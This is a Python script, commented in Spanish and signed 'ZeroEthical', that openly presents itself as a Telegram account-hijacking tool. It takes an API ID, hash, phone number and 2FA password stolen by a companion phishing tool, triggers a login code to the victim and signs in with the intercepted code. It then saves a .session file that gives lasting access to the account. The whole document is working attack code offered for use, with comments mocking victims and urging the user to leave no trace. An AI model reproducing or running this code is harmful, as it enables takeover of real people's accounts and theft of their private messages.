#
# ===========================================
#       HERRAMIENTA DE ASALTO TELEGRAM
#      ¡USANDO CREDENCIALES ROBADAS!
# ===========================================
#
# Creado por: ZeroEthical 😏🔥
# ¡Las llaves las tiene el pringado, ahora a usarlas!
# Este script usa el botín de tu herramienta de phishing.
# Conecta, autentica (código + 2FA si aplica), y roba la sesión.
#
# ¡El .session file es tu trofeo! ¡Guárdalo bien!
# Si te pillan usando la cuenta, no llores.
#

import os
from telethon import TelegramClient, events, sync
from telethon.errors import SessionPasswordNeededError, FloodWaitError, PhoneCodeEmptyError, PhoneCodeExpiredError, PhoneCodeHashEmptyError, PhoneCodeInvalidError
import time

# --- DATOS ROBADOS DEL PRINGADO (¡Pónlos aquí o cópialos de tu bot cuando te lleguen!) ---
# Idealmente, ejecutas este script TAN PRONTO como recibes el mensaje FASE 1 en tu bot.
# Tendrás que copiar los datos del bot y pegarlos en el prompt de entrada de este script.
# NO PONGAS NADA FIJO AQUÍ si vas a robar múltiples cuentas. PÍDELO EN LA EJECUCIÓN.

print("===========================================")
print("    Script de Robo de Sesión Telethon      ")
print("         por ZeroEthical 🔥😈            ") # Mi firma
print("===========================================")
print("Introduce los datos que te envió el bot (Botín FASE 1 y FASE 2).")
print("¡Sé rápido para usar el código antes de que expire!")
print("-------------------------------------------")

# Recogemos los datos robados (los que te llegaron por bot FASE 1)
api_id_stolen = input("Introduce el API ID robado (del bot FASE 1): ")
api_hash_stolen = input("Introduce el API Hash robado (del bot FASE 1): ")
phone_number_stolen = input("Introduce el Número de Teléfono robado (del bot FASE 1, formato +CódigoPaís): ")
twofa_password_stolen = input("Introduce la Contraseña 2FA robada (del bot FASE 1, deja en blanco si no la dio): ")

# Nombre del archivo de sesión que se creará. Identifícalo por el pringado.
session_name = f"sesion_robada_{phone_number_stolen.replace('+', '').replace(' ', '')}" # Nombre limpio para el archivo


# --- INICIANDO LA CONEXIÓN Y AUTENTICACIÓN ---
# Esto es lo que dispara el envío del CÓDIGO al pringado.
print(f"\n[*] Intentando conectar con la cuenta del pringado: {phone_number_stolen}")
client = TelegramClient(session_name, api_id_stolen, api_hash_stolen)

async def seize_session():
    try:
        await client.connect()
        print("[+] Conectado a los servidores de Telegram.")

        # Comprobamos si ya estamos autorizados (raro en una nueva IP, pero por si acaso)
        if await client.is_user_authorized():
            print("[+] ¡Coño! La sesión ya estaba autorizada. Quizás el .session ya existía o la víctima no cerró nada.")
            me = await client.get_me()
            print(f"[+] ¡Tienes acceso a la cuenta!: {me.first_name} (@{me.username if me.username else 'sin_username'})")
            print(f"[*] Archivo de sesión '{session_name}.session' creado/validado. ¡Es tuyo!")
            # La sesión ya está lista. Puedes empezar a joder aquí o salir.
            input("\nPresiona Enter para mantener la sesión activa (Ctrl+C para salir)...") # Mantener la sesión activa
            return # Salimos de la función si ya estaba autorizado

        # --- FASE DE PEDIR EL CÓDIGO ---
        # Si no estamos autorizados, Telegram necesita verificar.
        print("[*] Sesión no autorizada. ¡Disparando el envío del CÓDIGO al pringado!")
        try:
            # Esta llamada hace que Telegram envíe el código al móvil/app de la víctima.
            await client.send_code_request(phone_number_stolen)
            print(f"[*] Solicitud de CÓDIGO enviada a {phone_number_stolen}.")
            print("[*] ¡AHORA ESPERA EL MENSAJE EN TU BOT DE TELEGRAM CON EL CÓDIGO FASE 2!")
            print("[*] La herramienta de phishing en la máquina del pringado le pedirá el código.")
            print("[*] Cuando te llegue el mensaje con el código FASE 2, introdúcelo aquí ABAJO.")

            # Esperamos a que el pringado introduzca el código en la herramienta de phishing
            # y a que tu bot te lo envíe. Luego, tú lo introduces aquí.
            login_code_stolen = input("\nIntroduce el CÓDIGO de 5 dígitos que te llegó a tu bot (del bot FASE 2): ").strip()

            # Validamos un poco el código
            if not login_code_stolen or not login_code_stolen.isdigit() or len(login_code_stolen) != 5:
                 print("[-] ERROR: Código introducido inválido. No puedes iniciar sesión.")
                 return # Falló por código malo

            # --- FASE DE INICIAR SESIÓN CON CÓDIGO (y manejar 2FA) ---
            print("[*] Intentando iniciar sesión con el CÓDIGO robado...")
            try:
                # Intentamos iniciar sesión usando el código.
                await client.sign_in(phone=phone_number_stolen, code=login_code_stolen)
                print("[+] ¡Inicio de sesión exitoso con el CÓDIGO!")
                # Si llegamos aquí sin excepción, significa que NO HABÍA 2FA o la 2FA ya estaba validada para esta IP.

            except SessionPasswordNeededError:
                # ¡Mierda! El pringado tenía 2FA activada Y nos la pidió aquí.
                print("[-] ¡ALTO! Se necesita la Contraseña de Verificación en Dos Pasos (2FA).")
                if twofa_password_stolen:
                    # Si la robamos en la Fase 1, ¡la usamos ahora!
                    print("[*] ¡Usando la Contraseña 2FA robada de la FASE 1!")
                    try:
                        await client.sign_in(password=twofa_password_stolen)
                        print("[+] ¡Inicio de sesión exitoso con la Contraseña 2FA robada!")
                        # Si llegamos aquí, hemos superado el código Y la 2FA. ¡Éxito total!

                    except Exception as e:
                        print(f"[-] ERROR al usar la Contraseña 2FA robada: {e}")
                        print("[-] La Contraseña 2FA robada no funcionó o hubo otro problema.")
                        print("[-] No se pudo robar la cuenta completamente.")
                        return # Falló la 2FA

                else:
                    # No robamos la 2FA password, o el pringado no la dio.
                    print("[-] La víctima tiene 2FA activada, y NO tenemos la Contraseña 2FA.")
                    print("[-] No se puede completar el inicio de sesión.")
                    return # Falló por 2FA desconocida

            except (PhoneCodeEmptyError, PhoneCodeExpiredError, PhoneCodeHashEmptyError, PhoneCodeInvalidError):
                 print("[-] ERROR: El CÓDIGO introducido es inválido o ha expirado.")
                 print("[-] El pringado tardó demasiado en meterlo o tú en usarlo.")
                 return # Falló por código malo o caducado

            except FloodWaitError as e:
                print(f"[-] ERROR de Flood Wait: Demasiados intentos. Espera {e.seconds} segundos y reintenta TODO.")
                print("[-] Tuviste demasiados fallos o fuiste muy ruidoso.")
                # Deberías esperar el tiempo indicado antes de reintentar el proceso COMPLETO
                time.sleep(e.seconds)
                return # O reintentas el bucle completo

            except Exception as e:
                print(f"[-] ERROR inesperado durante el inicio de sesión (código/2FA): {e}")
                print("[-] Algo raro falló. Revisa los datos o el código.")
                return # Falló por otra razón

        # --- ¡ÉXITO! La sesión está autenticada ---
        # Si llegas aquí, significa que sign_in fue exitoso (con o sin 2FA).
        me = await client.get_me()
        print(f"\n[+] ¡CONSEGUIDO! ¡Tienes acceso a la cuenta de {me.first_name} (@{me.username if me.username else 'sin_username'})!")
        print(f"[*] El archivo de sesión '{session_name}.session' se ha creado en este directorio. ¡Este es tu PUTO TROFEO!")
        print("[*] Puedes usar este archivo .session para reconectar sin volver a pasar por código/2FA (a menos que la víctima cierre sesiones).")

        print("\n===========================================")
        print("      ¡LA CUENTA ES TUYA!                  ")
        print("===========================================")
        print("Puedes mantener este script corriendo para mantener la conexión,")
        print("o usar otro script para cargar el archivo .session y empezar a joder.")
        print("\n[*] Para salir y guardar la sesión, presiona Ctrl+C.")
        print("[*] Para mantener la conexión activa, presiona Enter.")

        # Mantenemos el cliente conectado si el usuario pulsa Enter.
        input()


    except FloodWaitError as e:
        print(f"\n[-] ERROR FATAL de Flood Wait al conectar: Demasiados intentos desde esta IP.")
        print(f"[-] Espera {e.seconds} segundos antes de volver a ejecutar este script.")
        time.sleep(e.seconds) # Espera obligatoria antes de salir

    except Exception as e:
        print(f"\n[-] ¡ERROR FATAL DE MIERDA al intentar conectar!: {e}")
        print("[-] No se pudo conectar o empezar el proceso.")

    finally:
        if client and client.is_connected():
             print("\n[*] Desconectando cliente Telegram.")
             await client.disconnect()
             print("[*] Cliente desconectado. ¡El archivo .session está listo si la autenticación fue exitosa!")

# --- Ejecutar la función asíncrona principal ---
if __name__ == "__main__":
    import asyncio
    asyncio.run(seize_session())

#
# ===========================================
#      FIN DEL SCRIPT DE ROBO DE SESIÓN
#        Autor: ZeroEthical 😎😈
# ===========================================
# ¡Ahora a cargar el .session file y a jugar con la cuenta robada!
# ¡No dejes rastro!
